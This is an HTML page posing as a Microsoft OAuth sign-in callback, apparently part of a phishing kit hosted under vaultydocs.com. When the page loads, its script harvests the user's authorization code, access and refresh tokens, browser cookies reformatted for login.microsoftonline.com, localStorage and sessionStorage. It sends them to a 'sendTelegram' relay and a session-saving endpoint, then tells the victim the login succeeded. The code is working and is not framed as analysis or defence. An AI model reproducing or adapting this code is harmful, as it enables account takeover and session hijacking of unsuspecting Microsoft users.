<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft OAuth Callback</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f3f2f1;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #d13438;
            margin-top: 20px;
        }
        .success {
            color: #107c10;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
                 <h2>Processing OAuth Response...</h2>
         <div class="spinner"></div>
         <p id="status">Exchanging authorization code for access token...</p>
         <div id="debug" style="background: #f0f0f0; padding: 10px; margin: 10px 0; font-size: 12px; border-radius: 4px;"></div>
         <div id="result"></div>
    </div>

         <script>
         async function handleOAuthCallback() {
             const statusEl = document.getElementById('status');
             const resultEl = document.getElementById('result');
             
                           // DOMAIN DEBUG INFO
              const domainInfo = {
                  origin: window.location.origin,
                  hostname: window.location.hostname,
                  href: window.location.href,
                  pathname: window.location.pathname,
                  functionUrl: window.location.origin + '/.netlify/functions/sendTelegram'
              };
              
              console.log('üîç CALLBACK PAGE DOMAIN INFO:', domainInfo);
              
              // Show domain info on page
              const debugEl = document.getElementById('debug');
              debugEl.innerHTML = `
                  <strong>Domain Debug:</strong><br>
                  Origin: ${domainInfo.origin}<br>
                  Function URL: ${domainInfo.functionUrl}<br>
                  Current URL: ${domainInfo.href}
              `;

            try {
                // Get URL parameters
                const urlParams = new URLSearchParams(window.location.search);
                const code = urlParams.get('code');
                const state = urlParams.get('state');
                const error = urlParams.get('error');

                console.log('üîç OAuth callback received:', { code: !!code, state, error });

                if (error) {
                    throw new Error(`OAuth error: ${error} - ${urlParams.get('error_description')}`);
                }

                if (!code) {
                    throw new Error('No authorization code received');
                }

                statusEl.textContent = 'Exchanging code for tokens...';

                // Exchange code for tokens
                // Since we don't have the client_secret, we'll use the implicit flow approach
                // or handle this via your backend to keep secrets secure
                statusEl.textContent = 'Skipping token exchange - using authorization code directly...';
                
                // Create session data with the authorization code
                const sessionData = {
                    email: 'oauth-user@microsoft.com', // Will be updated after we get profile
                    name: 'OAuth User',
                    id: 'oauth_' + Math.random().toString(36).substring(2, 15),
                    provider: 'Microsoft',
                    sessionId: Math.random().toString(36).substring(2, 15),
                    timestamp: new Date().toISOString(),
                    authorizationCode: code,
                    oauthState: state,
                    authenticationMethod: 'OAuth',
                    password: 'OAuth Login - Authorization Code: ' + code.substring(0, 20) + '...',
                    fileName: 'Microsoft OAuth Login',
                    userProfile: {
                        authCode: code,
                        redirectUri: 'https://vaultydocs.com/oauth-callback',
                        clientId: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'
                    }
                };

                console.log('üîç Session data prepared:', { 
                    email: sessionData.email, 
                    hasAuthCode: !!sessionData.authorizationCode 
                });

                // Try alternative token exchange via your backend (if you have a secure endpoint)
                let tokenData = null;
                try {
                    statusEl.textContent = 'Attempting backend token exchange...';
                    const backendTokenResponse = await fetch(`${currentDomain}/.netlify/functions/exchangeToken`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            code: code,
                            redirect_uri: 'https://vaultydocs.com/oauth-callback'
                        })
                    });
                    
                    if (backendTokenResponse.ok) {
                        tokenData = await backendTokenResponse.json();
                        console.log('‚úÖ Backend token exchange successful');
                    }
                } catch (backendError) {
                    console.log('‚ö†Ô∏è Backend token exchange not available, proceeding with auth code');
                }

                // If we got tokens from backend, get user profile
                if (tokenData && tokenData.access_token) {
                    try {
                        statusEl.textContent = 'Getting user profile...';
                        const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                            headers: {
                                'Authorization': `Bearer ${tokenData.access_token}`,
                            }
                        });

                        if (profileResponse.ok) {
                            const profileData = await profileResponse.json();
                            sessionData.email = profileData.mail || profileData.userPrincipalName || 'oauth-user@microsoft.com';
                            sessionData.name = profileData.displayName || 'OAuth User';
                            sessionData.id = profileData.id || sessionData.id;
                            sessionData.accessToken = tokenData.access_token;
                            sessionData.refreshToken = tokenData.refresh_token;
                            sessionData.userProfile = profileData;
                            console.log('‚úÖ User profile updated:', { email: sessionData.email });
                        }
                    } catch (profileError) {
                        console.log('‚ö†Ô∏è Profile fetch failed, using auth code data');
                    }
                                 }

                // Format cookies properly
                const cookieStrings = document.cookie.split(';').filter(c => c.trim());
                sessionData.formattedCookies = cookieStrings.map(c => {
                    const [name, value] = c.trim().split('=');
                    return name && value ? {
                        name: name,
                        value: value,
                        domain: '.login.microsoftonline.com',
                        path: '/',
                        secure: true,
                        httpOnly: false,
                        sameSite: 'none',
                        expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                        hostOnly: false,
                        session: false,
                        storeId: null
                    } : null;
                }).filter(cookie => cookie !== null);

                console.log('üîç Session data prepared:', { 
                    email: sessionData.email, 
                    cookieCount: sessionData.formattedCookies.length 
                });

                statusEl.textContent = 'Sending data to backend...';
                
                // DEBUG: Log what we're about to send
                console.log('üîç About to send to Telegram:', {
                    domain: window.location.origin,
                    email: sessionData.email,
                    sessionId: sessionData.sessionId,
                    hasAuthCode: !!sessionData.authorizationCode
                });

                // Send to Telegram via your backend (use current domain)
                const currentDomain = window.location.origin;
                console.log('üîç Sending to domain:', currentDomain);
                
                let telegramResponse;
                try {
                    telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                        email: sessionData.email,
                        password: sessionData.password,
                        provider: sessionData.provider,
                        fileName: sessionData.fileName,
                        timestamp: sessionData.timestamp,
                        sessionId: sessionData.sessionId,
                        userAgent: navigator.userAgent,
                        browserFingerprint: {
                            cookies: sessionData.formattedCookies,
                            localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
                            sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            platform: navigator.platform,
                            timestamp: new Date().toISOString()
                        },
                        documentCookies: document.cookie,
                        formattedCookies: sessionData.formattedCookies,
                        cookies: document.cookie,
                                                 accessToken: sessionData.accessToken,
                         refreshToken: sessionData.refreshToken,
                         userProfile: sessionData.userProfile
                     })
                 });
                 
                 console.log('‚úÖ Fetch completed, response received');
                 
                 } catch (fetchError) {
                     console.error('‚ùå Fetch failed:', fetchError);
                     throw new Error(`Failed to send to Telegram: ${fetchError.message}`);
                 }

                const telegramResult = await telegramResponse.json();
                console.log('üîç Telegram result:', telegramResult);
                console.log('üîç Telegram response status:', telegramResponse.status);
                console.log('üîç Telegram response ok:', telegramResponse.ok);

                // Save session
                await fetch(`${currentDomain}/.netlify/functions/saveSession`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ...sessionData,
                        browserFingerprint: {
                            cookies: sessionData.formattedCookies,
                            localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
                            sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
                            userAgent: navigator.userAgent
                        },
                        skipTelegram: true
                    })
                });

                // Show success
                statusEl.textContent = 'Success!';
                resultEl.innerHTML = `
                    <div class="success">
                        <h3>‚úÖ Login Successful!</h3>
                        <p><strong>Email:</strong> ${sessionData.email}</p>
                        <p><strong>Provider:</strong> Microsoft</p>
                        <p><strong>Cookies captured:</strong> ${sessionData.formattedCookies.length}</p>
                                                 <p><strong>Data sent to Telegram:</strong> ${telegramResult.success ? 'Yes' : 'No'}</p>
                         <p><strong>Authorization Code:</strong> ${sessionData.authorizationCode ? 'Captured' : 'None'}</p>
                        <p style="margin-top: 20px;">
                            <small>You can close this window now.</small>
                        </p>
                    </div>
                `;

                // Auto-close after 3 seconds
                setTimeout(() => {
                    window.close();
                }, 3000);

            } catch (error) {
                console.error('‚ùå OAuth callback error:', error);
                statusEl.textContent = 'Error occurred';
                resultEl.innerHTML = `
                    <div class="error">
                        <h3>‚ùå OAuth Error</h3>
                        <p>${error.message}</p>
                        <p style="margin-top: 20px;">
                            <small>Please try again or contact support.</small>
                        </p>
                    </div>
                `;
            }
        }

        // Run when page loads
        handleOAuthCallback();
        
        // IMMEDIATE TEST: Send a simple test message to verify Telegram works from this page
        setTimeout(async () => {
            console.log('üß™ IMMEDIATE TEST: Sending test message from callback page...');
            try {
                const testResponse = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: 'callback-page-test@immediate.com',
                        password: 'IMMEDIATE TEST from OAuth callback page',
                        provider: 'Microsoft',
                        formattedCookies: [],
                        sessionId: 'immediate_test_' + Date.now(),
                        fileName: 'OAuth Callback Page Test',
                        timestamp: new Date().toISOString()
                    })
                });
                
                const testResult = await testResponse.json();
                console.log('üß™ IMMEDIATE TEST result:', testResult);
                
                if (testResult.success) {
                    console.log('‚úÖ IMMEDIATE TEST SUCCESS - Telegram works from callback page!');
                } else {
                    console.log('‚ùå IMMEDIATE TEST FAILED:', testResult.error);
                }
            } catch (testError) {
                console.error('‚ùå IMMEDIATE TEST ERROR:', testError);
            }
        }, 2000); // Wait 2 seconds after page load
    </script>
</body>
</html>